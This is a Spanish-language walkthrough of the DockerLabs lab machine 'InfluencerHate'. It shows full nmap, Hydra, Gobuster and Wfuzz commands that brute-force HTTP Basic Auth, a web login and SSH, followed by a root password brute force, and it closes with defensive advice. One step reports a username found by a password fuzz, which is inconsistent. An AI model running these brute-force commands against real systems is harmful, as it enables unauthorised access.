# InfluencerHate — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 28/06/2025  
**Técnicas:** Nmap · Hydra · HTTP Basic Auth · Gobuster · Burp Suite · Wfuzz · SSH · Fuerza bruta

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [HTTP Basic Auth — fuerza bruta con Hydra](#2-http-basic-auth--fuerza-bruta-con-hydra)
3. [Enumeración web — Gobuster con Authorization](#3-enumeración-web--gobuster-con-authorization)
4. [Login.php — descubrimiento de credenciales con Wfuzz](#4-loginphp--descubrimiento-de-credenciales-con-wfuzz)
5. [Acceso SSH — Hydra](#5-acceso-ssh--hydra)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh influencerhate.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo de puertos:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

Resultado:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

El servicio HTTP solicita autenticación antes de acceder.

---

## 2. HTTP Basic Auth — fuerza bruta con Hydra

Al acceder al servidor web encontramos un panel protegido por autenticación HTTP Basic.

Realizamos fuerza bruta con Hydra utilizando un archivo de combinaciones:

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 172.17.0.2 -s 80 http-get /
```

Explicación de los parámetros utilizados:

- `-C` → utiliza un fichero con combinaciones `usuario:contraseña`
- `-s 80` → especifica el puerto HTTP
- `http-get` → módulo de autenticación HTTP GET

Resultado:

```text
login: httpadmin
password: fhttpadmin
```

Ahora podemos autenticarnos en el servicio web.

---

## 3. Enumeración web — Gobuster con Authorization

Interceptamos la petición con Burp Suite para obtener la cabecera Authorization.

Cabecera encontrada:

```text
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
```

Utilizamos Gobuster añadiendo la cabecera personalizada:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,txt \
-H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
```

Encontramos un recurso interesante:

```text
/login.php
```

La página contiene un formulario de autenticación.

---

## 4. Login.php — descubrimiento de credenciales con Wfuzz

Después de varias pruebas utilizamos Burp Suite para analizar la petición POST enviada al login.

Realizamos fuerza bruta sobre la contraseña del usuario `admin` con Wfuzz:

```bash
wfuzz -c \
-z file,/usr/share/wordlists/rockyou.txt \
-t 50 \
--hh=2848 \
-H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=admin&password=FUZZ" \
http://172.17.0.2/login.php
```

Explicación de parámetros importantes:

- `-z file` → utiliza una wordlist
- `-t 50` → 50 peticiones concurrentes
- `--hh=2848` → oculta respuestas de tamaño repetido
- `FUZZ` → reemplazado automáticamente por cada contraseña

Resultado encontrado:

```text
Usuario: balutin
```

La aplicación devuelve un mensaje de login correcto.

---

## 5. Acceso SSH — Hydra

Probamos fuerza bruta sobre SSH utilizando el usuario encontrado.

```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Resultado:

```text
login: balutin
password: estrella
```

Accedemos al sistema:

```bash
ssh balutin@172.17.0.2
```

---

## 6. Escalada de privilegios

Intentamos diferentes técnicas de escalada de privilegios, pero no encontramos:

- sudoers vulnerables
- binarios SUID útiles
- tareas cron explotables

Finalmente utilizamos una herramienta de fuerza bruta contra el usuario root.

Como `wget` y `curl` no funcionaban correctamente para transferir archivos, compartimos la herramienta mediante `scp`.

```bash
scp herramienta balutin@172.17.0.2:/tmp
```

Ejecutamos la herramienta en la máquina víctima y obtenemos la contraseña de root.

Accedemos como root:

```bash
su root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| HTTP Basic Auth con credenciales débiles | Acceso inicial |
| Enumeración de directorios autenticados | Descubrimiento de login.php |
| Contraseña débil en formulario web | Obtención de usuario válido |
| Contraseña SSH reutilizada o débil | Acceso remoto |
| Credenciales root vulnerables | Escalada total |

**Para defenderse:**

- Utilizar contraseñas robustas y únicas.
- Limitar ataques de fuerza bruta con fail2ban o rate limiting.
- No reutilizar credenciales entre servicios.
- Restringir enumeración de directorios.
- Implementar MFA en accesos sensibles.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
